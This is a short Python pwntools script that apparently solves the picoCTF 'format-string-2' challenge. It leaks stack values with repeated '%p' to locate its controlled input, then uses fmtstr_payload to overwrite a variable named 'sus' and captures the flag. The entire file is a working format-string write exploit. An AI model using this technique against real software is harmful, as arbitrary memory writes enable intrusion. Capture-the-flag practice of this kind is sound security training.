#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF('./format-string-2')


def run():
    return process(elf.path)
    # return remote('rhea.picoctf.net', 60839)


# Find first controlled formatter offset
p = run()
p.sendlineafter(b'What do you have to say?', b"AAAAAAAA" + b"-%p" * 30)
p.recvuntil(b'Here\'s your input: ')
leak = p.recvline().strip().split(b'-')
offset = leak.index(b'0x4141414141414141')
log.info(f'{offset=}')

# Generate payload
p = run()
payload = fmtstr_payload(offset, {elf.sym.sus: 0x67616c66})

# Get flag
p.sendlineafter(b'What do you have to say?', payload)
p.interactive()
